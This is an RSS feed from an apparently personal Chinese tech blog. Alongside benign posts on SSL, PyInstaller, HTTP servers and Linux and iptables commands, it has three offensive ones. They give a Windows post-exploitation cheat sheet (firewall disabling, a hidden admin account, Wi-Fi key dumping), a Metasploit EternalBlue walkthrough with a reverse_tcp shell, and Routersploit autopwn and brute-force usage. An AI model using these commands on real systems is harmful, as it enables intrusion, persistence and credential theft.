<?xml version="1.0" encoding="UTF-8"?>  
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">  
    <channel>  
        <title></title>  
        <description>王俊博客，软件改变世界！王俊博客是作者个人知识库、是记录历程回顾的笔记本、是经验教训的资源池， 旨在促进软件开发领域知识与创新的传播，为软件开发中提供帮助。更多是作者本人的经验积累。
</description>  
        <link>http://localhost:4000</link>  
        <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />  
          
            <item>  
               <title>在渗透后非常有用的windows命令整理</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#在渗透后非常有用的windows命令整理&quot; id=&quot;markdown-toc-在渗透后非常有用的windows命令整理&quot;&gt;在渗透后非常有用的windows命令整理&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#注意事项&quot; id=&quot;markdown-toc-注意事项&quot;&gt;注意事项&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#命令明细&quot; id=&quot;markdown-toc-命令明细&quot;&gt;命令明细&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;在渗透后非常有用的windows命令整理&quot;&gt;在渗透后非常有用的windows命令整理&lt;/h1&gt;

&lt;h2 id=&quot;注意事项&quot;&gt;注意事项&lt;/h2&gt;

&lt;p&gt;以下整理的命令不一定在所有windows平台适用，如win10版本等高版本的系统会被拒绝访问，某些杀毒软件会弹出提示框显示授权操作，所以建议是拿到超级管理员权限，且将目标主机的杀毒软件卸载或者关闭。&lt;/p&gt;

&lt;h2 id=&quot;命令明细&quot;&gt;命令明细&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 关闭防火墙
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable

# 添加防火墙出入站规则（关闭防火墙失败的情况）
netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445
# 检查查看防火墙配置的出入站规则
netsh firewall show portopening

# 查看进程杀死进程
tasklist
tskill 6486

# 创建用户并添加到管理员组
net user vinny$ 123321 /add
net localgroup administrators vinny$ /add

# 删除目标用户或者密码
net user vinny$ *
net user vinny$ /delete

# 压缩文件夹或者文件（目标系统安装好winrar的情况）
&quot;%ProgramFiles%\Winrar\rar&quot; a -ag -k -r -s -ibck a.rar &quot;SAP BYD资料&quot;
&quot;%ProgramFiles%\Winrar\rar&quot; a -ag -k -r -s -ibck a.rar 1.txt 2.txt

# 查看目标机器保存的无线热点和密码
netsh wlan show profile
netsh wlan show profile name=&quot;menote2&quot; key=clear
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>  
               <pubDate>Sun, 29 Oct 2017 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2017/10/windows-useful-cmds/</link>  
               <guid isPermaLink="true">http://localhost:4000/2017/10/windows-useful-cmds/</guid>  
               </item>  
          
            <item>  
               <title>永恒之蓝(ms17-010-eternalblue)漏洞利用</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#永恒之蓝ms17-010-eternalblue漏洞利用&quot; id=&quot;markdown-toc-永恒之蓝ms17-010-eternalblue漏洞利用&quot;&gt;永恒之蓝(ms17-010-eternalblue)漏洞利用&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#适用版本&quot; id=&quot;markdown-toc-适用版本&quot;&gt;适用版本&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#目标扫描&quot; id=&quot;markdown-toc-目标扫描&quot;&gt;目标扫描&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#漏洞攻击&quot; id=&quot;markdown-toc-漏洞攻击&quot;&gt;漏洞攻击&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;永恒之蓝ms17-010-eternalblue漏洞利用&quot;&gt;永恒之蓝(ms17-010-eternalblue)漏洞利用&lt;/h1&gt;

&lt;h2 id=&quot;适用版本&quot;&gt;适用版本&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Windows XP (all services pack) (x86) (x64)&lt;/li&gt;
  &lt;li&gt;Windows Server 2003 SP0 (x86)&lt;/li&gt;
  &lt;li&gt;Windows Server 2003 SP1/SP2 (x86)&lt;/li&gt;
  &lt;li&gt;Windows Server 2003 (x64)&lt;/li&gt;
  &lt;li&gt;Windows Vista (x86)&lt;/li&gt;
  &lt;li&gt;Windows Vista (x64)&lt;/li&gt;
  &lt;li&gt;Windows Server 2008 (x86)&lt;/li&gt;
  &lt;li&gt;Windows Server 2008 R2 (x86) (x64)&lt;/li&gt;
  &lt;li&gt;Windows 7 (all services pack) (x86) (x64)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;目标扫描&quot;&gt;目标扫描&lt;/h2&gt;

&lt;p&gt;这里以内网扫描进行测试，所有扫描内网中所有主机，并检查其是否存在此漏洞。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/smb/smb_ms17_010
msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 192.168.1.0/24
msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;THREADS 100
msf &amp;gt; exploit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;漏洞攻击&quot;&gt;漏洞攻击&lt;/h2&gt;

&lt;p&gt;确定好目标主机后，就可以使用启动监听并进行攻击&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/windows/smb/ms17_010_eternalblue
msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 192.168.1.15
msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT 4444
msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST 192.168.1.110
msf &amp;gt; exploit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>  
               <pubDate>Sat, 28 Oct 2017 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2017/10/ms17-010-eternalblue/</link>  
               <guid isPermaLink="true">http://localhost:4000/2017/10/ms17-010-eternalblue/</guid>  
               </item>  
          
            <item>  
               <title>使用Lets Encrypt为站点快速部署SSL证书</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#使用lets-encrypt为站点快速部署ssl证书&quot; id=&quot;markdown-toc-使用lets-encrypt为站点快速部署ssl证书&quot;&gt;使用Lets Encrypt为站点快速部署SSL证书&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#使用背景&quot; id=&quot;markdown-toc-使用背景&quot;&gt;使用背景&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#下载安装脚本&quot; id=&quot;markdown-toc-下载安装脚本&quot;&gt;下载安装脚本&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#配置相关信息&quot; id=&quot;markdown-toc-配置相关信息&quot;&gt;配置相关信息&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#执行证书生成&quot; id=&quot;markdown-toc-执行证书生成&quot;&gt;执行证书生成&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#配置证书安装&quot; id=&quot;markdown-toc-配置证书安装&quot;&gt;配置证书安装&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;使用lets-encrypt为站点快速部署ssl证书&quot;&gt;使用Lets Encrypt为站点快速部署SSL证书&lt;/h1&gt;

&lt;h2 id=&quot;使用背景&quot;&gt;使用背景&lt;/h2&gt;

&lt;p&gt;时常搜索”免费ssl证书”，申请和验证步骤很麻烦，审核时间也不定，”&lt;strong&gt;&lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Lets Encrypt&lt;/a&gt;&lt;/strong&gt;“是一个倡导互联网上所有网站都该使用https的组织，提供免费的ssl证书服务。&lt;/p&gt;

&lt;h2 id=&quot;下载安装脚本&quot;&gt;下载安装脚本&lt;/h2&gt;

&lt;p&gt;下载Github上贡献者做好的安装脚本，如下：&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/xdtianyu/scripts/master/lets-encrypt/letsencrypt.conf
wget https://raw.githubusercontent.com/xdtianyu/scripts/master/lets-encrypt/letsencrypt.sh

&lt;span class=&quot;c&quot;&gt;# 赋予执行权限&lt;/span&gt;
chmod +x letsencrypt.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;配置相关信息&quot;&gt;配置相关信息&lt;/h2&gt;

&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;vi letsencrypt.conf&lt;/code&gt;打开配置文件，将里面的 &lt;strong&gt;example.com&lt;/strong&gt; 换成自己的域名，如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# only modify the values, key files will be generated automaticly.
ACCOUNT_KEY=&quot;letsencrypt-account.key&quot;
DOMAIN_KEY=&quot;tiger.com.key&quot;
DOMAIN_DIR=&quot;/usr/local/openresty/nginx/html&quot;
DOMAINS=&quot;DNS:test.tiger.com&quot;
#ECC=TRUE
#LIGHTTPD=TRUE
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;按以往免费申请ssl的经历，通常都需要验证域名的所属权，不是通过配置二级域名验证就是需要在网站根目录上传验证文件，经过试用 &lt;strong&gt;Lets Encrypt&lt;/strong&gt;，发现它使用的是第二种方式。&lt;/p&gt;

&lt;p&gt;所以在使用nginx做动态代理时，需要先注释掉，使用基本的静态文件方式配置nginx的虚拟主机以便 &lt;strong&gt;Lets Encrypt&lt;/strong&gt; 去做验证，等ssl安装好之后在配置成动态代理即可。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;所以上述配置文件中的 DOMAIN_DIR 很重要，否则会执行失败&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;执行证书生成&quot;&gt;执行证书生成&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./letsencrypt.sh ./letsencrypt.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;没有什么错误就会生成如下的几个文件，其中&lt;strong&gt;tiger.chained.crt&lt;/strong&gt;和&lt;strong&gt;tiger.com.key&lt;/strong&gt;就是需要的文件。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;letsencrypt-account.key
tiger.crt
tiger.csr
tiger.chained.crt
tiger.com.key
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;配置证书安装&quot;&gt;配置证书安装&lt;/h2&gt;

&lt;p&gt;这里使用nginx进行证书安装的服务器&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server {
	listen       443;
	server_name  test.tiger.com;

    ssl on;
    ssl_certificate tiger.chained.crt;
    ssl_certificate_key tiger.com.key;
    ssl_session_timeout 5m;

    location / {
        root html;
        index  index.html index.htm;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>  
               <pubDate>Fri, 27 Oct 2017 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2017/10/lets-encrypt-ssl/</link>  
               <guid isPermaLink="true">http://localhost:4000/2017/10/lets-encrypt-ssl/</guid>  
               </item>  
          
            <item>  
               <title>Pyinstaller打包python应用</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#pyinstaller打包python应用&quot; id=&quot;markdown-toc-pyinstaller打包python应用&quot;&gt;Pyinstaller打包python应用&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#打包参数&quot; id=&quot;markdown-toc-打包参数&quot;&gt;打包参数&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#使用方法&quot; id=&quot;markdown-toc-使用方法&quot;&gt;使用方法&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;pyinstaller打包python应用&quot;&gt;Pyinstaller打包python应用&lt;/h1&gt;

&lt;h2 id=&quot;打包参数&quot;&gt;打包参数&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;参数&lt;/th&gt;
      &lt;th&gt;说明&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;-w&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;直接打包会带调试窗口，使用-w参数可以进行屏蔽&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;-C&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;使用调试界面，与-w参数相反，缺省&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;-F&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;打包成独立的exe文件&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;-D&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;与-F相反，生成多个以来文件，缺省&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;-p&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;搜索模块路径&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;-i&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;改变生产的exe图标&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;使用方法&quot;&gt;使用方法&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pyinstaller -w main.py
pyinstaller -w -F main.py
pyinstaller -w -F -p &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;绝对路径] main.py
pyinstaller -w -F -i main.ico -p &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;绝对路径] main.py
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>  
               <pubDate>Wed, 11 Oct 2017 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2017/10/pyinstaller-package/</link>  
               <guid isPermaLink="true">http://localhost:4000/2017/10/pyinstaller-package/</guid>  
               </item>  
          
            <item>  
               <title>简单的几个命令快速创建http服务器的方式</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#简单的几个命令快速创建http服务器的方式&quot; id=&quot;markdown-toc-简单的几个命令快速创建http服务器的方式&quot;&gt;简单的几个命令快速创建http服务器的方式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;简单的几个命令快速创建http服务器的方式&quot;&gt;简单的几个命令快速创建http服务器的方式&lt;/h1&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 -m SimpleHTTPServer 8000
python3 -m http.server 8000
php -S 0.0.0.0:80000
ruby -rwebrick -e &lt;span class=&quot;s2&quot;&gt;&quot;WEBrick::HTTPServer.new(:Port =&amp;gt; 8000, :DocumentRoot =&amp;gt; Dir.pwd).start&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>  
               <pubDate>Tue, 10 Oct 2017 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2017/10/http-server-ways/</link>  
               <guid isPermaLink="true">http://localhost:4000/2017/10/http-server-ways/</guid>  
               </item>  
          
            <item>  
               <title>路由器漏洞检测与破解工具Routersploit</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#路由器漏洞检测与破解工具routersploit&quot; id=&quot;markdown-toc-路由器漏洞检测与破解工具routersploit&quot;&gt;路由器漏洞检测与破解工具Routersploit&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-说明介绍&quot; id=&quot;markdown-toc-1-说明介绍&quot;&gt;1. 说明介绍&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-如何下载&quot; id=&quot;markdown-toc-2-如何下载&quot;&gt;2. 如何下载&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-怎么更新&quot; id=&quot;markdown-toc-3-怎么更新&quot;&gt;3. 怎么更新&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#4-包含模块&quot; id=&quot;markdown-toc-4-包含模块&quot;&gt;4. 包含模块&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#5-使用方式&quot; id=&quot;markdown-toc-5-使用方式&quot;&gt;5. 使用方式&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#51-路由器漏洞使用&quot; id=&quot;markdown-toc-51-路由器漏洞使用&quot;&gt;5.1 路由器漏洞使用&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#52-暴力破解的使用&quot; id=&quot;markdown-toc-52-暴力破解的使用&quot;&gt;5.2 暴力破解的使用&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;路由器漏洞检测与破解工具routersploit&quot;&gt;路由器漏洞检测与破解工具Routersploit&lt;/h1&gt;

&lt;h2 id=&quot;1-说明介绍&quot;&gt;1. 说明介绍&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Routersploit&lt;/strong&gt; 是一款针对路由器漏洞进行破解的工具，&lt;strong&gt;使用面很窄&lt;/strong&gt;，另外还自带了暴力破解模块。&lt;/p&gt;

&lt;h2 id=&quot;2-如何下载&quot;&gt;2. 如何下载&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/reverse-shell/routersploit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;3-怎么更新&quot;&gt;3. 怎么更新&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git pull
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;4-包含模块&quot;&gt;4. 包含模块&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;scanners &lt;strong&gt;检查目标设备是否存在可利用的安全漏洞&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;creds &lt;strong&gt;针对网络服务器的登陆认证口令进行暴力破解&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;exploits &lt;strong&gt;识别目标的漏洞后对漏洞进行利用实现提权&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;5-使用方式&quot;&gt;5. 使用方式&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Routersploit&lt;/strong&gt; 的使用方式类似与 &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt;，属于交互式运行方式，大体为”选择模块”-“设置参数”-“执行攻击”。&lt;/p&gt;

&lt;h3 id=&quot;51-路由器漏洞使用&quot;&gt;5.1 路由器漏洞使用&lt;/h3&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rsf &amp;gt; use scanners/&amp;lt;tab&amp;gt; &lt;span class=&quot;c&quot;&gt;# 列出支持的路由器攻击列表&lt;/span&gt;
rsf &amp;gt; use scanners/autopwn &lt;span class=&quot;c&quot;&gt;# 遍历路由器列表进行攻击&lt;/span&gt;
rsf &amp;gt; show options &lt;span class=&quot;c&quot;&gt;# 查看选项&lt;/span&gt;
rsf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;target 192.168.1.1 &lt;span class=&quot;c&quot;&gt;# 设置参数&lt;/span&gt;
rsf &amp;gt; run &lt;span class=&quot;c&quot;&gt;# 执行&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;上面只是查找目标路由器是否存在特定的漏洞，若存在可以使用 &lt;strong&gt;exploits&lt;/strong&gt; 模块进行漏洞攻击。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;52-暴力破解的使用&quot;&gt;5.2 暴力破解的使用&lt;/h3&gt;

&lt;p&gt;支持http、ftp、ssh、telnet、snmp，自带了缺省的密码词典。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rsf &amp;gt; use creds/&amp;lt;tab&amp;gt; &lt;span class=&quot;c&quot;&gt;# 列出所有支持暴力破解的协议&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>  
               <pubDate>Mon, 09 Oct 2017 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2017/10/how-to-use-router-sploit/</link>  
               <guid isPermaLink="true">http://localhost:4000/2017/10/how-to-use-router-sploit/</guid>  
               </item>  
          
            <item>  
               <title>Linux个人常用命令汇总收集（不断更新）</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#linux个人常用命令汇总&quot; id=&quot;markdown-toc-linux个人常用命令汇总&quot;&gt;Linux个人常用命令汇总&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#查看端口被谁占用&quot; id=&quot;markdown-toc-查看端口被谁占用&quot;&gt;查看端口被谁占用&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#递归删除指定文件&quot; id=&quot;markdown-toc-递归删除指定文件&quot;&gt;递归删除指定文件&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#内存cache占用大&quot; id=&quot;markdown-toc-内存cache占用大&quot;&gt;内存cache占用大&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;linux个人常用命令汇总&quot;&gt;Linux个人常用命令汇总&lt;/h1&gt;

&lt;h2 id=&quot;查看端口被谁占用&quot;&gt;查看端口被谁占用&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lsof -i:8080
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;递归删除指定文件&quot;&gt;递归删除指定文件&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find . -name &lt;span class=&quot;s2&quot;&gt;&quot;*.bak&quot;&lt;/span&gt; -exec rm &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
find . -name &lt;span class=&quot;s2&quot;&gt;&quot;*.c&quot;&lt;/span&gt; | xargs rm -rf;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;内存cache占用大&quot;&gt;内存cache占用大&lt;/h2&gt;

&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;free -m&lt;/code&gt;时会发现内存的&lt;strong&gt;cache&lt;/strong&gt;段缓存的过多，导致内存不够用，可以使用以下命令进行清空。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;shell&amp;gt; &lt;/span&gt;free -m
             total       used       free     shared    buffers     cached
Mem:         15888      15226        661        248        624       5123
-/+ buffers/cache:       9479       6408
Swap:          499          0        499
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sync;
sync;
sync;
&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;3 &amp;gt; /proc/sys/vm/drop_caches
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;此命令有风险，会破坏内存中存储的数据，尤其不要在Oracle服务器中使用&lt;/p&gt;
&lt;/blockquote&gt;
</description>  
               <pubDate>Sun, 23 Jul 2017 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2017/07/linux-skill-gather/</link>  
               <guid isPermaLink="true">http://localhost:4000/2017/07/linux-skill-gather/</guid>  
               </item>  
          
            <item>  
               <title>Debain防火墙规则保存</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#debain防火墙规则保存&quot; id=&quot;markdown-toc-debain防火墙规则保存&quot;&gt;Debain防火墙规则保存&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-背景&quot; id=&quot;markdown-toc-1-背景&quot;&gt;1. 背景&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-步骤&quot; id=&quot;markdown-toc-2-步骤&quot;&gt;2. 步骤&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#21-保存规则&quot; id=&quot;markdown-toc-21-保存规则&quot;&gt;2.1 保存规则&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-启动文件&quot; id=&quot;markdown-toc-22-启动文件&quot;&gt;2.2 启动文件&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-文件内容&quot; id=&quot;markdown-toc-23-文件内容&quot;&gt;2.3 文件内容&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;debain防火墙规则保存&quot;&gt;Debain防火墙规则保存&lt;/h1&gt;

&lt;h2 id=&quot;1-背景&quot;&gt;1. 背景&lt;/h2&gt;

&lt;p&gt;配置好防火墙规则后，为防止服务器重启导致配置的规则被清除，应该将防火墙规则进行文件保存，在启动时进行自动加载。&lt;/p&gt;

&lt;h2 id=&quot;2-步骤&quot;&gt;2. 步骤&lt;/h2&gt;

&lt;h2 id=&quot;21-保存规则&quot;&gt;2.1 保存规则&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 将现有防火墙规则保存到/etc/iptables文件中&lt;/span&gt;
iptables-save &amp;gt; /etc/iptables
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;22-启动文件&quot;&gt;2.2 启动文件&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 创建启动脚本文件&lt;/span&gt;
touch /etc/network/if-pre-up.d/iptables
&lt;span class=&quot;c&quot;&gt;# 赋予执行权限&lt;/span&gt;
chmod u+x /etc/network/if-pre-up.d/iptables
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;23-文件内容&quot;&gt;2.3 文件内容&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 编辑启动配置文件&lt;/span&gt;
vi /etc/network/if-pre-up.d/iptables

&lt;span class=&quot;c&quot;&gt;# 文件内容为还原保存的防火墙配置规则&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
/sbin/iptables-restore &amp;lt; /etc/iptables
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>  
